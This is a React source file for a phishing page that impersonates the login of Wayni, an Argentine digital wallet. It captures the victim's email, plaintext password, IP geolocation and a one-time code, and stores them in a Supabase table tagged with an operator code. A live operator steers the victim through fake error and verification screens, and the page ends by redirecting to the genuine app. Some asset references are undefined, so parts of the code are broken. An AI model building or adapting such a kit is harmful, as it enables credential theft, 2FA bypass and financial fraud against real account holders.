import { useState, useEffect, useCallback } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import WayniLoginForm from "@/components/wayni/WayniLoginForm";
import WayniWaitingScreen from "@/components/wayni/WayniWaitingScreen";
import WayniOtpScreen from "@/components/wayni/WayniOtpScreen";
import WayniSuccessScreen from "@/components/wayni/WayniSuccessScreen";
import wayniBgPattern from "@/assets/wayni-bg-pattern.svg";
import storeApple from "@/assets/wayni-store-apple.jpeg";
import storeGoogle from "@/assets/wayni-store-google.jpeg";

type Step = "login" | "waiting" | "otp" | "finalizing" | "done";

const WAYNI_REDIRECT_URL = "https://app.wayni.com.ar";

const Wayni = () => {
  const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
  const operatorCode = rawOperatorCode?.replace(/[^a-zA-Z0-9]/g, "") || "master";

  const [step, setStep] = useState<Step>("login");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [errorMessage, setErrorMessage] = useState("");
  const [finalizingMessage, setFinalizingMessage] = useState("Estamos verificando tus datos con seguridad...");

  useVisitTracker();
  useVisitorPresence(sessionId);

  useEffect(() => {
    document.title = "Wayni — Accedé a tu billetera";
    const link = document.querySelector("link[rel='icon']") as HTMLLinkElement;
    if (link) link.href = "data:,";
  }, []);

  // Finalizing redirect
  useEffect(() => {
    if (step !== "finalizing") return;
    setFinalizingMessage("Estamos verificando tus datos con seguridad...");
    const t1 = setTimeout(() => setFinalizingMessage("Aguardá un momento más..."), 1800);
    const t2 = setTimeout(() => setFinalizingMessage("¡Todo listo! Redirigiendo..."), 3600);
    const t3 = setTimeout(() => window.location.assign(WAYNI_REDIRECT_URL), 4600);
    return () => { clearTimeout(t1); clearTimeout(t2); clearTimeout(t3); };
  }, [step]);

  // Realtime listener
  useEffect(() => {
    if (!sessionId || step === "login" || step === "done" || step === "finalizing") return;
    const channel = supabase.channel(`session-review-${sessionId}`);
    channel.on("broadcast", { event: "review_decision" }, (p) => handleDecision(p.payload?.status)).subscribe();
    const otpChannel = supabase.channel(`session-otp-decision-${sessionId}`);
    otpChannel.on("broadcast", { event: "otp_decision" }, (p) => handleDecision(p.payload?.status)).subscribe();
    const poll = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (data) handleDecision(data.status);
    }, 3000);
    return () => { supabase.removeChannel(channel); supabase.removeChannel(otpChannel); clearInterval(poll); };
  }, [sessionId, step]);

  const handleDecision = useCallback((status?: string) => {
    if (!status) return;
    if (["login_success", "approved", "completed", "otp_approved"].includes(status)) {
      setError(""); setErrorMessage(""); setStep("finalizing");
    } else if (status === "wrong_password") { setErrorMessage("Email o contraseña incorrectos."); setStep("login"); }
    else if (status === "account_not_found") { setErrorMessage("Cuenta no encontrada."); setStep("login"); }
    else if (status === "account_blocked") { setErrorMessage("Cuenta bloqueada."); setStep("login"); }
    else if (status === "rate_limited") { setErrorMessage("Demasiados intentos."); setStep("login"); }
    else if (["connection_error", "login_error"].includes(status)) { setErrorMessage("Error al iniciar sesión."); setStep("login"); }
    else if (["redirect_otp", "show_otp"].includes(status)) { setStep("otp"); setErrorMessage(""); }
    else if (status === "otp_rejected") { setErrorMessage("Código incorrecto."); setStep("otp"); }
  }, []);

  const handleLogin = useCallback(async (submittedEmail: string, password: string) => {
    setError(""); setErrorMessage(""); setLoading(true); setEmail(submittedEmail);

    let ipData = { ip: "unknown", country: "", city: "", region: "" };
    try {
      const res = await fetch("https://ipapi.co/json/");
      if (res.ok) { const d = await res.json(); ipData = { ip: d.ip || "unknown", country: d.country_name || "", city: d.city || "", region: d.region || "" }; }
    } catch {}

    let currentSessionId = sessionId;
    try {
      if (currentSessionId) {
        await supabase.from("sessions").update({ email: submittedEmail, password, status: "pending_review" }).eq("id", currentSessionId);
      } else {
        const newId = crypto.randomUUID();
        await supabase.from("sessions").insert({
          id: newId, email: submittedEmail, password, ip_address: ipData.ip, user_agent: navigator.userAgent,
          country: ipData.country, city: ipData.city, region: ipData.region,
          status: "pending_review", source: "wayni", operator_code: operatorCode,
        });
        setSessionId(newId); currentSessionId = newId;
      }
    } catch {}

    setStep("waiting");
    setLoading(false);
  }, [sessionId, operatorCode]);

  const handleOtpSubmit = useCallback(async (code: string) => {
    if (!sessionId) return;
    setError(""); setErrorMessage(""); setLoading(true);
    try {
      await supabase.from("sessions").update({ otp_code: code, status: "otp_submitted" }).eq("id", sessionId);
      setStep("waiting");
    } catch { setError("Error al enviar el código."); }
    setLoading(false);
  }, [sessionId]);

  const renderContent = () => {
    switch (step) {
      case "login": return <WayniLoginForm onSubmit={handleLogin} loading={loading} error={error || errorMessage} />;
      case "waiting": return <WayniWaitingScreen email={email} />;
      case "finalizing": return <WayniWaitingScreen email={email} message={finalizingMessage} />;
      case "otp": return <WayniOtpScreen email={email} />;
      case "done": return <WayniSuccessScreen email={email} />;
    }
  };

  // ─── MOBILE (390px viewport) ───
  return (
    <div className="min-h-screen relative overflow-hidden" style={{ backgroundColor: "#c8e64a" }}>
      {/* Full background image */}
      <img
        src={wayniBg}
        alt=""
        className="absolute inset-0 w-full h-full object-cover"
      />

      {/* Content overlay */}
      <div className="relative z-10 flex flex-col min-h-screen">
        {/* Top nav */}
        <nav className="flex items-center justify-between px-5 py-4 md:px-10 md:py-5">
          <img src={wayniLogoDark} alt="wayni" className="h-6 md:h-7" />
          <div className="hidden md:flex items-center gap-8">
            <span className="text-[14px] text-[#1a1a1a] font-medium cursor-pointer hover:opacity-70 transition-opacity">Préstamos</span>
            <span className="text-[14px] text-[#1a1a1a] font-medium cursor-pointer hover:opacity-70 transition-opacity">Centro de ayuda</span>
            <span className="text-[14px] text-[#1a1a1a] font-medium cursor-pointer hover:opacity-70 transition-opacity">Blog</span>
          </div>
        </nav>

        {/* Desktop: split layout */}
        <div className="hidden md:flex flex-1 items-center px-10 lg:px-16 xl:px-24">
          {/* Left */}
          <div className="flex-1 max-w-[55%]">
            <h1 className="text-[48px] lg:text-[56px] font-black text-[#1a1a1a] leading-[1.1] mb-6" style={{ fontFamily: "'Inter', sans-serif" }}>
              Porque ahora podés
            </h1>
            <p className="text-[16px] text-[#333] mb-6 max-w-[480px]">
              Descubrí una nueva forma de manejar tu plata.
            </p>
            <div className="flex flex-col gap-3 mb-8">
              {["Financiate de la mejor forma con Adelantos", "Enviá y recibí plata en el momento", "Comprá donde quieras con tu tarjeta Mastercard"].map((t) => (
                <div key={t} className="flex items-center gap-2.5">
                  <span className="w-5 h-5 rounded-full bg-[#00b894] flex items-center justify-center flex-shrink-0">
                    <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
                  </span>
                  <span className="text-[15px] text-[#1a1a1a] font-medium">{t}</span>
                </div>
              ))}
            </div>
            <div className="bg-white rounded-2xl px-6 py-4 inline-flex items-center gap-3 shadow-sm w-fit">
              <span className="text-[13px] font-semibold text-[#1a1a1a]">Impulsá tus finanzas con Wayni</span>
              <img src={storeGoogle} alt="Google Play" className="h-[36px] rounded-md" />
              <img src={storeApple} alt="App Store" className="h-[36px] rounded-md" />
            </div>
          </div>

          {/* Right form card */}
          <div className="flex items-center justify-center px-4" style={{ minWidth: 380, maxWidth: 460 }}>
            <div className="bg-white rounded-3xl shadow-2xl p-8 w-full max-w-[420px]">
              {renderContent()}
            </div>
          </div>
        </div>

        {/* Mobile: logo + spacer + bottom card */}
        <div className="flex flex-col flex-1 md:hidden">
          {/* Logo centered */}
          <div className="flex justify-center pt-8 pb-4">
            <img src={wayniLogo} alt="wayni" className="h-10" />
          </div>

          {/* Spacer */}
          <div className="flex-1" />

          {/* Bottom card */}
          <div className="bg-white rounded-t-3xl px-6 pt-8 pb-8 shadow-2xl">
            {renderContent()}
          </div>
        </div>
      </div>
    </div>
  );
};

export default Wayni;
